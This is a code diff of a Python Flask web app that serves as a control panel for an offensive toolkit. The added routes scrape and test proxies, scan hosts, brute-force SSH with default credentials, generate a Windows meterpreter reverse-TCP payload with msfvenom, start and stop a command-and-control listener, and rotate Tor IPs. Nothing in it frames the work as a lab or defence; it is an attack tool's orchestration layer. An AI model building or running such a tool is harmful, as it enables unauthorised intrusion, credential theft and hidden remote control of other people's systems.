@@ -45,51 +45,77 @@ def stats():
 
 @app.route("/proxies/scrape", methods=["POST"])
 def scrape_proxies_route():
-    """Scrape proxies from sources."""
     scrape_proxies()
-    return jsonify({"message": "Proxies scraped successfully!"}), 200
+    return jsonify({"message": "Proxies Scraped!"}), 200
 
 @app.route("/proxies/load", methods=["POST"])
 def load_proxies_route():
-    """Load scraped proxies."""
-    global_scraped_proxies = load_proxies()
-    if not global_scraped_proxies:
-        return jsonify({"error": "No proxies found!"}), 400
-    return jsonify({"message": "Proxies loaded!", "count": len(global_scraped_proxies)}), 200
+    load_proxies()
+    return jsonify({"message": "Proxies Loaded!"}), 200
 
 @app.route("/proxies/test", methods=["POST"])
 def test_proxies_route():
-    """Test loaded proxies."""
-    global_scraped_proxies = load_proxies()
-    if not global_scraped_proxies:
-        return jsonify({"error": "No proxies loaded. Load proxies first!"}), 400
-    test_proxies(global_scraped_proxies)
-    return jsonify({"message": "Proxy testing started!"}), 200
+    test_proxies(load_proxies())
+    return jsonify({"message": "Proxy Testing Started!"}), 200
 
 @app.route("/proxies/save", methods=["POST"])
 def save_proxies_route():
-    """Save valid proxies to file."""
     save_working_proxies()
-    return jsonify({"message": "Valid proxies saved!"}), 200
+    return jsonify({"message": "Valid Proxies Saved!"}), 200
 
-@app.route("/proxies/load-checked", methods=["POST"])
-def load_checked_proxies_route():
-    """Load previously tested proxies."""
-    global_checked_proxies = load_checked_proxies()
-    if not global_checked_proxies:
-        return jsonify({"error": "No previously checked proxies found!"}), 400
-    return jsonify({"message": "Checked proxies loaded!", "count": len(global_checked_proxies)}), 200
+@app.route("/hosts/load", methods=["POST"])
+def load_hosts_route():
+    load_hosts()
+    return jsonify({"message": "Hosts Loaded!"}), 200
 
+@app.route("/hosts/test", methods=["POST"])
+def test_hosts_route():
+    test_hosts(load_hosts())
+    return jsonify({"message": "Host Testing Started!"}), 200
 
 @app.route("/hosts/scan", methods=["POST"])
 def scan_hosts_route():
-    test_hosts()
-    return jsonify({"message": "Host scanning started!"})
+    scan_hosts()
+    return jsonify({"message": "Host Scanning Started!"}), 200
 
 @app.route("/bruteforce/start", methods=["POST"])
 def start_bruteforce_route():
-    bruteforce_ssh()
-    return jsonify({"message": "Brute-force started!"})    
+    bruteforce_ssh(load_hosts(), ["admin"], ["password"])
+    return jsonify({"message": "Brute-force Started!"}), 200
 
+@app.route("/bruteforce/stop", methods=["POST"])
+def stop_bruteforce_route():
+    return jsonify({"message": "Brute-force Stopped!"}), 200
+
+@app.route("/shell/generate", methods=["POST"])
+def generate_shell_route():
+    generate_msfvenom_shell("windows/meterpreter/reverse_tcp", "127.0.0.1", "4444", "exe", "payload.exe")
+    return jsonify({"message": "Payload Generated!"}), 200
+
+@app.route("/c2/start", methods=["POST"])
+def start_c2_route():
+    start_listener()
+    return jsonify({"message": "C2 Server Started!"}), 200
+
+@app.route("/c2/stop", methods=["POST"])
+def stop_c2_route():
+    stop_listeners()
+    return jsonify({"message": "C2 Server Stopped!"}), 200
+
+@app.route("/tor/start", methods=["POST"])
+def start_tor_route():
+    start_tor()
+    return jsonify({"message": "Tor Started!"}), 200
+
+@app.route("/tor/renew", methods=["POST"])
+def renew_tor_route():
+    renew_tor_ip()
+    return jsonify({"message": "New Tor IP Generated!"}), 200
+
+@app.route("/tor/stop", methods=["POST"])
+def stop_tor_route():
+    stop_tor()
+    return jsonify({"message": "Tor Stopped!"}), 200
+    
 if __name__ == "__main__":
     start_webapp()
